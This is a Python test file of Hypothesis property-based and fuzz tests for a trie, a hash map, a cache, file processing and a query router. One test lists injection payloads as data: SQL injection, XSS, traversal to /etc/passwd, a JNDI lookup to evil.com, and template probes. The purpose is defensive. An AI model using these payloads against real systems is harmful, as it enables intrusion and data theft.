# Property-Based and Fuzz Tests
# Production-grade property-based and fuzz testing for edge cases and robustness

import pytest
import random
import string
import json
import csv
import io
import tempfile
import os
import asyncio
from typing import Any, Dict, List, Optional, Union, Callable
from hypothesis import given, strategies as st, settings, example, assume
from hypothesis.stateful import RuleBasedStateMachine, rule, invariant, initialize
from unittest.mock import patch, Mock
import sys

# Define custom exception for security testing
class SecurityError(Exception):
    """Custom exception for security-related errors in testing"""
    pass

# Import components for property-based testing
sys.path.append(os.path.join(os.path.dirname(__file__), '..', '..', 'src'))
from backend.core.optimized_data_structures import OptimizedTrie, HighPerformanceHashMap, OptimizedDataProcessor
from backend.core.optimized_llm_client import OptimizedLLMClient, SmartCache
from backend.core.optimized_file_io import OptimizedFileProcessor, StreamingCSVReader
from backend.core.enhanced_cache_integration import EnhancedCacheManager
from backend.core.intelligent_query_engine import IntelligentQueryRouter, QueryPatternAnalyzer

class FuzzTestGenerator:
    """Utility for generating fuzz test data"""
    
    @staticmethod
    def generate_random_string(min_length: int = 0, max_length: int = 1000) -> str:
        """Generate random string with various characteristics"""
        length = random.randint(min_length, max_length)
        
        # Mix of different character types
        chars = []
        for _ in range(length):
            char_type = random.choice(['ascii', 'unicode', 'control', 'whitespace'])
            
            if char_type == 'ascii':
                chars.append(random.choice(string.ascii_letters + string.digits))
            elif char_type == 'unicode':
                chars.append(chr(random.randint(128, 1000)))
            elif char_type == 'control':
                chars.append(chr(random.randint(0, 31)))
            else:  # whitespace
                chars.append(random.choice([' ', '\t', '\n', '\r']))
        
        return ''.join(chars)
    
    @staticmethod
    def generate_malformed_json() -> str:
        """Generate malformed JSON strings"""
        patterns = [
            '{"key": "value"',  # Missing closing brace
            '{"key": "value"}extra',  # Extra content
            '{key: "value"}',  # Unquoted key
            '{"key": undefined}',  # Invalid value
            '{"key": "value",}',  # Trailing comma
            '[1, 2, 3,]',  # Trailing comma in array
            '{"nested": {"key": "value"}',  # Missing closing braces
            '""',  # Just quotes
            '{null: null}',  # null key
            '{"\\u": "invalid"}',  # Invalid unicode escape
        ]
        return random.choice(patterns)
    
    @staticmethod
    def generate_malformed_csv() -> str:
        """Generate malformed CSV strings"""
        patterns = [
            'header1,header2\nvalue1',  # Missing value
            'header1,header2\nvalue1,value2,extra',  # Extra value
            'header1,header2\n"unclosed quote,value2',  # Unclosed quote
            'header1,header2\nvalue1,"value with\nnewline",value3',  # Embedded newline
            ',header2\nvalue1,value2',  # Empty header
            'header1,\nvalue1,value2',  # Empty header
            'header1,header2\n,value2',  # Empty value
            'header1,header2\nvalue1,',  # Empty value at end
            '"header1,header2"\nvalue1,value2',  # Quoted header line
            'header1;header2\nvalue1;value2',  # Wrong delimiter
        ]
        return random.choice(patterns)
    
    @staticmethod
    def generate_extreme_values() -> List[Any]:
        """Generate extreme values for testing"""
        return [
            "",  # Empty string
            " " * 10000,  # Very long whitespace
            "A" * 1000000,  # Very long string
            "\x00" * 100,  # Null bytes
            "🚀" * 1000,  # Unicode characters
            "\n" * 500,  # Many newlines
            "\t" * 500,  # Many tabs
            json.dumps({"nested": {"very": {"deep": {"structure": "value"}}}}) * 100,  # Deep nesting
            -999999999999999999999,  # Very large negative number
            999999999999999999999,  # Very large positive number
            0.000000000000000001,  # Very small float
            float('inf'),  # Infinity
            float('-inf'),  # Negative infinity
            float('nan'),  # NaN
            None,  # None value
            [],  # Empty list
            [None] * 1000,  # List of Nones
            {"key": None} * 1000,  # Dict with None values
        ]


class TestTriePropertyBased:
    """Property-based tests for OptimizedTrie"""
    
    @given(st.text(min_size=1, max_size=100), st.text(max_size=200))
    def test_trie_insert_search_property(self, key: str, value: str):
        """Property: Anything inserted should be searchable"""
        trie = OptimizedTrie()
        
        # Insert key-value pair
        trie.insert(key, value)
        
        # Should be able to find it
        result = trie.search(key)
        assert result == value
    
    @given(st.lists(st.tuples(st.text(min_size=1, max_size=50), st.text(max_size=100)), min_size=1, max_size=100))
    def test_trie_bulk_operations_property(self, key_value_pairs: List[tuple]):
        """Property: Bulk insertions should all be searchable"""
        trie = OptimizedTrie()
        
        # Remove duplicates while preserving order
        unique_pairs = []
        seen_keys = set()
        for key, value in key_value_pairs:
            if key not in seen_keys:
                unique_pairs.append((key, value))
                seen_keys.add(key)
        
        # Insert all pairs
        for key, value in unique_pairs:
            trie.insert(key, value)
        
        # Verify size
        assert trie.size == len(unique_pairs)
        
        # Verify all can be found
        for key, expected_value in unique_pairs:
            result = trie.search(key)
            assert result == expected_value
    
    @given(st.text(min_size=1, max_size=50))
    def test_trie_nonexistent_search_property(self, nonexistent_key: str):
        """Property: Searching for non-inserted keys should return None"""
        trie = OptimizedTrie()
        
        # Don't insert the key
        result = trie.search(nonexistent_key)
        assert result is None
    
    @given(st.text(min_size=1, max_size=50), st.text(max_size=100), st.text(max_size=100))
    def test_trie_update_property(self, key: str, initial_value: str, new_value: str):
        """Property: Updating a key should reflect the new value"""
        trie = OptimizedTrie()
        
        # Insert initial value
        trie.insert(key, initial_value)
        initial_size = trie.size
        
        # Update with new value
        trie.insert(key, new_value)
        
        # Size should not change (update, not insert)
        assert trie.size == initial_size
        
        # Should return new value
        result = trie.search(key)
        assert result == new_value
    
    def test_trie_fuzz_extreme_inputs(self):
        """Fuzz test with extreme inputs"""
        trie = OptimizedTrie()
        extreme_values = FuzzTestGenerator.generate_extreme_values()
        
        for i, value in enumerate(extreme_values):
            try:
                key = f"extreme_key_{i}"
                if isinstance(value, str) and len(value) > 0:
                    # Use the value as both key and value for string values
                    trie.insert(value[:100], str(value))  # Limit key length
                    result = trie.search(value[:100])
                    assert result == str(value)
                elif value is not None:
                    # Use string representation for non-string values
                    trie.insert(key, str(value))
                    result = trie.search(key)
                    assert result == str(value)
            except (TypeError, ValueError, MemoryError):
                # Expected for some extreme values
                pass
    
    @given(st.text(alphabet=st.characters(blacklist_categories=['Cs']), min_size=0, max_size=200))
    def test_trie_unicode_robustness(self, unicode_text: str):
        """Property: Trie should handle various Unicode inputs robustly"""
        trie = OptimizedTrie()
        
        if len(unicode_text) > 0:
            try:
                trie.insert(unicode_text, f"value_for_{hash(unicode_text)}")
                result = trie.search(unicode_text)
                assert result == f"value_for_{hash(unicode_text)}"
            except (UnicodeError, MemoryError):
                # Some Unicode combinations may cause issues
                pass


class TestHashMapPropertyBased:
    """Property-based tests for HighPerformanceHashMap"""
    
    @given(st.text(min_size=1, max_size=100), st.text(max_size=200))
    def test_hashmap_put_get_property(self, key: str, value: str):
        """Property: Put and get should be consistent"""
        hashmap = HighPerformanceHashMap()
        
        hashmap.put(key, value)
        result = hashmap.get(key)
        assert result == value
    
    @given(st.dictionaries(st.text(min_size=1, max_size=50), st.text(max_size=100), min_size=1, max_size=100))
    def test_hashmap_bulk_operations_property(self, test_dict: Dict[str, str]):
        """Property: Bulk operations should maintain consistency"""
        hashmap = HighPerformanceHashMap()
        
        # Insert all items
        for key, value in test_dict.items():
            hashmap.put(key, value)
        
        # Verify size
        assert hashmap.size() == len(test_dict)
        
        # Verify all items
        for key, expected_value in test_dict.items():
            result = hashmap.get(key)
            assert result == expected_value
    
    @given(st.text(min_size=1, max_size=50), st.text(max_size=100))
    def test_hashmap_contains_property(self, key: str, value: str):
        """Property: Contains should be consistent with put/get"""
        hashmap = HighPerformanceHashMap()
        
        # Initially should not contain key
        assert not hashmap.contains_key(key)
        
        # After putting, should contain key
        hashmap.put(key, value)
        assert hashmap.contains_key(key)
        
        # After removing, should not contain key
        hashmap.remove(key)
        assert not hashmap.contains_key(key)
    
    def test_hashmap_fuzz_hash_collisions(self):
        """Fuzz test with intentional hash collisions"""
        hashmap = HighPerformanceHashMap(initial_capacity=4)  # Small capacity to force collisions
        
        # Generate many keys that will likely collide
        collision_keys = []
        for i in range(100):
            # Create keys that will have similar hash values
            key = f"collision_key_{i % 10}_{i}"
            collision_keys.append(key)
            hashmap.put(key, f"value_{i}")
        
        # Verify all keys can be retrieved
        for i, key in enumerate(collision_keys):
            result = hashmap.get(key)
            assert result == f"value_{i}"
        
        # Verify size
        assert hashmap.size() == len(collision_keys)
    
    @given(st.lists(st.tuples(st.text(min_size=1, max_size=30), st.one_of(st.none(), st.text(), st.integers(), st.floats(allow_nan=False))), min_size=1, max_size=50))
    def test_hashmap_mixed_value_types(self, key_value_pairs: List[tuple]):
        """Property: HashMap should handle mixed value types"""
        hashmap = HighPerformanceHashMap()
        
        # Remove duplicate keys
        unique_pairs = {}
        for key, value in key_value_pairs:
            unique_pairs[key] = value
        
        # Insert all pairs
        for key, value in unique_pairs.items():
            hashmap.put(key, value)
        
        # Verify all pairs
        for key, expected_value in unique_pairs.items():
            result = hashmap.get(key)
            assert result == expected_value


class TestCachePropertyBased:
    """Property-based tests for SmartCache"""
    
    @given(st.text(min_size=1, max_size=100), st.text(max_size=200))
    def test_cache_put_get_property(self, key: str, value: str):
        """Property: Recently cached items should be retrievable"""
        cache = SmartCache(max_size=100, ttl=3600)
        
        cache.put(key, value)
        result = cache.get(key)
        assert result == value
    
    @given(st.integers(min_value=1, max_value=20))
    def test_cache_lru_eviction_property(self, cache_size: int):
        """Property: LRU eviction should work correctly"""
        cache = SmartCache(max_size=cache_size, ttl=3600)
        
        # Fill cache to capacity
        for i in range(cache_size):
            cache.put(f"key_{i}", f"value_{i}")
        
        # Access first item to make it recently used
        cache.get("key_0")
        
        # Add one more item (should evict least recently used)
        cache.put("new_key", "new_value")
        
        # First item should still be there (recently accessed)
        assert cache.get("key_0") == "value_0"
        
        # New item should be there
        assert cache.get("new_key") == "new_value"
        
        # Some old item should be evicted (but we can't predict which one exactly)
        assert cache.size <= cache_size
    
    def test_cache_fuzz_extreme_ttl(self):
        """Fuzz test with extreme TTL values"""
        extreme_ttls = [0, 0.001, 1e-10, 1e10, float('inf')]
        
        for ttl in extreme_ttls:
            try:
                cache = SmartCache(max_size=10, ttl=ttl)
                cache.put("test_key", "test_value")
                
                if ttl > 0.01:  # Should be retrievable for reasonable TTLs
                    result = cache.get("test_key")
                    assert result == "test_value"
                
            except (ValueError, OverflowError):
                # Some extreme values may be rejected
                pass
    
    @given(st.lists(st.text(min_size=1, max_size=50), min_size=1, max_size=100))
    def test_cache_concurrent_access_simulation(self, keys: List[str]):
        """Property: Cache should handle rapid put/get operations"""
        cache = SmartCache(max_size=50, ttl=3600)
        unique_keys = list(set(keys))  # Remove duplicates
        
        # Rapid put operations
        for key in unique_keys:
            cache.put(key, f"value_for_{key}")
        
        # Rapid get operations
        for key in unique_keys:
            result = cache.get(key)
            if result is not None:  # May be evicted due to size limits
                assert result == f"value_for_{key}"


class TestFileIOPropertyBased:
    """Property-based tests for file I/O operations"""
    
    @given(st.lists(st.lists(st.text(max_size=100), min_size=1, max_size=10), min_size=1, max_size=100))
    def test_csv_roundtrip_property(self, csv_data: List[List[str]]):
        """Property: CSV data should survive write/read roundtrip"""
        # Ensure consistent row lengths
        if csv_data:
            max_cols = max(len(row) for row in csv_data)
            normalized_data = [row + [''] * (max_cols - len(row)) for row in csv_data]
        else:
            normalized_data = []
        
        # Write CSV to temporary file
        with tempfile.NamedTemporaryFile(mode='w', suffix='.csv', delete=False) as f:
            writer = csv.writer(f)
            for row in normalized_data:
                writer.writerow(row)
            temp_path = f.name
        
        try:
            # Read back using our processor
            processor = OptimizedFileProcessor()
            result = asyncio.run(processor.process_file(temp_path))
            
            if 'error' not in result:
                assert result['file_type'] == 'csv'
                assert len(result['data']) == len(normalized_data) - 1  # Minus header row
        
        finally:
            os.unlink(temp_path)
    
    def test_file_type_detection_fuzz(self):
        """Fuzz test file type detection with malformed content"""
        detector = FileTypeDetector()
        
        malformed_contents = [
            FuzzTestGenerator.generate_malformed_json(),
            FuzzTestGenerator.generate_malformed_csv(),
            FuzzTestGenerator.generate_random_string(0, 1000),
            "\x00\x01\x02\x03\x04",  # Binary-like content
            "<?xml version='1.0'?><root></root>",  # XML
            "<!DOCTYPE html><html></html>",  # HTML
            "SELECT * FROM table;",  # SQL
            "#include <stdio.h>\nint main() { return 0; }",  # C code
        ]
        
        for content in malformed_contents:
            with tempfile.NamedTemporaryFile(mode='w', delete=False) as f:
                try:
                    f.write(content)
                    temp_path = f.name
                except UnicodeEncodeError:
                    # Skip content that can't be written
                    continue
            
            try:
                result = detector.detect_file_type(temp_path)
                # Should not crash and should return some result
                assert 'file_type' in result
                assert 'confidence' in result
            except Exception as e:
                # Should handle errors gracefully
                assert "error" in str(e).lower() or "invalid" in str(e).lower()
            finally:
                os.unlink(temp_path)
    
    @given(st.dictionaries(st.text(min_size=1, max_size=50), st.one_of(st.none(), st.text(), st.integers(), st.floats(allow_nan=False), st.booleans()), min_size=1, max_size=20))
    def test_json_processing_property(self, json_data: Dict[str, Any]):
        """Property: Valid JSON should be processed correctly"""
        # Write JSON to temporary file
        with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
            json.dump(json_data, f)
            temp_path = f.name
        
        try:
            processor = OptimizedFileProcessor()
            result = asyncio.run(processor.process_file(temp_path))
            
            if 'error' not in result:
                assert result['file_type'] == 'json'
                assert result['data'] == json_data
        
        finally:
            os.unlink(temp_path)


class TestQueryEnginePropertyBased:
    """Property-based tests for query processing"""
    
    @given(st.text(min_size=1, max_size=500))
    def test_query_analysis_robustness(self, query: str):
        """Property: Query analyzer should handle any text input"""
        analyzer = QueryPatternAnalyzer()
        
        try:
            result = analyzer.analyze_query(query)
            
            # Should always return a result structure
            assert isinstance(result, dict)
            assert 'query_type' in result
            assert 'complexity' in result
            
        except Exception as e:
            # Should handle errors gracefully
            assert "invalid" in str(e).lower() or "error" in str(e).lower()
    
    def test_query_injection_fuzz(self):
        """Fuzz test for query injection patterns"""
        router = IntelligentQueryRouter()
        
        # Common injection patterns
        injection_patterns = [
            "'; DROP TABLE users; --",
            "<script>alert('xss')</script>",
            "../../etc/passwd",
            "${jndi:ldap://evil.com/a}",
            "' OR '1'='1",
            "admin'/*",
            "1; SELECT * FROM users",
            "{{7*7}}",  # Template injection
            "${7*7}",   # Expression injection
            "#{7*7}",   # OGNL injection
        ]
        
        for pattern in injection_patterns:
            try:
                result = asyncio.run(router.route_query(pattern))
                
                # Should handle injection attempts safely
                assert 'error' in result or 'selected_agent' in result
                
                # Should not execute harmful operations
                assert 'DROP' not in str(result).upper()
                assert 'DELETE' not in str(result).upper()
                
            except Exception as e:
                # Should handle malicious inputs gracefully
                assert isinstance(e, (ValueError, SecurityError, TypeError))


class TestStatefulPropertyTesting:
    """Stateful property testing using Hypothesis"""

class TrieStateMachine(RuleBasedStateMachine):
    """Stateful testing for trie operations"""
    
    def __init__(self):
        super().__init__()
        self.trie = OptimizedTrie()
        self.model = {}  # Python dict as reference model
    
    @rule(key=st.text(min_size=1, max_size=50), value=st.text(max_size=100))
    def insert(self, key: str, value: str):
        """Insert operation"""
        self.trie.insert(key, value)
        self.model[key] = value
    
    @rule(key=st.text(min_size=1, max_size=50))
    def search(self, key: str):
        """Search operation"""
        trie_result = self.trie.search(key)
        model_result = self.model.get(key)
        assert trie_result == model_result
    
    @invariant()
    def size_consistency(self):
        """Invariant: trie size should match model size"""
        assert self.trie.size == len(self.model)
    
    @invariant()
    def search_consistency(self):
        """Invariant: all model keys should be searchable in trie"""
        for key, value in self.model.items():
            assert self.trie.search(key) == value


class HashMapStateMachine(RuleBasedStateMachine):
    """Stateful testing for hashmap operations"""
    
    def __init__(self):
        super().__init__()
        self.hashmap = HighPerformanceHashMap()
        self.model = {}
    
    @rule(key=st.text(min_size=1, max_size=50), value=st.text(max_size=100))
    def put(self, key: str, value: str):
        """Put operation"""
        self.hashmap.put(key, value)
        self.model[key] = value
    
    @rule(key=st.text(min_size=1, max_size=50))
    def get(self, key: str):
        """Get operation"""
        hashmap_result = self.hashmap.get(key)
        model_result = self.model.get(key)
        assert hashmap_result == model_result
    
    @rule(key=st.text(min_size=1, max_size=50))
    def remove(self, key: str):
        """Remove operation"""
        hashmap_result = self.hashmap.remove(key)
        model_result = self.model.pop(key, None)
        assert hashmap_result == model_result
    
    @rule(key=st.text(min_size=1, max_size=50))
    def contains(self, key: str):
        """Contains operation"""
        hashmap_result = self.hashmap.contains_key(key)
        model_result = key in self.model
        assert hashmap_result == model_result
    
    @invariant()
    def size_consistency(self):
        """Invariant: hashmap size should match model size"""
        assert self.hashmap.size() == len(self.model)


# Stateful test classes
class TestStatefulTrie:
    """Run stateful trie tests"""
    
    @pytest.mark.fuzz
    def test_trie_stateful(self):
        """Run stateful trie testing"""
        state_machine = TrieStateMachine
        state_machine.TestCase.settings = settings(max_examples=100, stateful_step_count=50)
        
        # Run the state machine
        try:
            state_machine().runTest()
        except Exception as e:
            pytest.fail(f"Stateful trie test failed: {e}")


class TestStatefulHashMap:
    """Run stateful hashmap tests"""
    
    @pytest.mark.fuzz
    def test_hashmap_stateful(self):
        """Run stateful hashmap testing"""
        state_machine = HashMapStateMachine
        state_machine.TestCase.settings = settings(max_examples=100, stateful_step_count=50)
        
        try:
            state_machine().runTest()
        except Exception as e:
            pytest.fail(f"Stateful hashmap test failed: {e}")


class TestErrorRecoveryFuzz:
    """Fuzz tests for error recovery and resilience"""
    
    def test_memory_pressure_recovery(self):
        """Test recovery under memory pressure"""
        components = [
            OptimizedTrie(),
            HighPerformanceHashMap(),
            SmartCache(max_size=100, ttl=3600)
        ]
        
        try:
            # Simulate memory pressure by creating large data
            large_data = []
            for i in range(10000):
                data = "x" * 1000  # 1KB strings
                large_data.append(data)
                
                # Try operations on components
                for component in components:
                    try:
                        if hasattr(component, 'insert'):
                            component.insert(f"key_{i}", data)
                        elif hasattr(component, 'put'):
                            component.put(f"key_{i}", data)
                    except (MemoryError, OverflowError):
                        # Expected under memory pressure
                        pass
        
        except MemoryError:
            # System ran out of memory - this is expected in stress test
            pass
        
        # Components should still be functional after memory pressure
        for component in components:
            try:
                if hasattr(component, 'insert'):
                    component.insert("recovery_test", "recovery_value")
                    assert component.search("recovery_test") == "recovery_value"
                elif hasattr(component, 'put'):
                    component.put("recovery_test", "recovery_value")
                    assert component.get("recovery_test") == "recovery_value"
            except Exception as e:
                pytest.fail(f"Component failed to recover: {e}")
    
    def test_concurrent_corruption_resistance(self):
        """Test resistance to concurrent corruption"""
        import threading
        import time
        
        hashmap = HighPerformanceHashMap()
        errors = []
        
        def aggressive_operations(thread_id):
            """Perform aggressive operations in parallel"""
            try:
                for i in range(1000):
                    key = f"thread_{thread_id}_key_{i}"
                    value = f"thread_{thread_id}_value_{i}"
                    
                    # Rapid put/get/remove operations
                    hashmap.put(key, value)
                    result = hashmap.get(key)
                    
                    if result != value:
                        errors.append(f"Inconsistency in thread {thread_id}: expected {value}, got {result}")
                    
                    if i % 3 == 0:
                        hashmap.remove(key)
                    
                    time.sleep(0.001)  # Small delay
                    
            except Exception as e:
                errors.append(f"Thread {thread_id} error: {e}")
        
        # Run multiple threads
        threads = []
        for i in range(5):
            thread = threading.Thread(target=aggressive_operations, args=(i,))
            threads.append(thread)
            thread.start()
        
        # Wait for completion
        for thread in threads:
            thread.join()
        
        # Check for corruption
        if errors:
            print(f"Concurrent corruption detected: {errors[:5]}")  # Show first 5 errors
        
        # Should have reasonable success rate even under concurrency stress
        success_rate = 1 - (len(errors) / 5000)  # 5 threads * 1000 operations
        assert success_rate > 0.8, f"Success rate {success_rate:.2f} too low under concurrency"


if __name__ == '__main__':
    # Run property-based and fuzz tests
    pytest.main([
        __file__,
        '-v',
        '--tb=short',
        '-m', 'fuzz',
        '--hypothesis-show-statistics'
    ])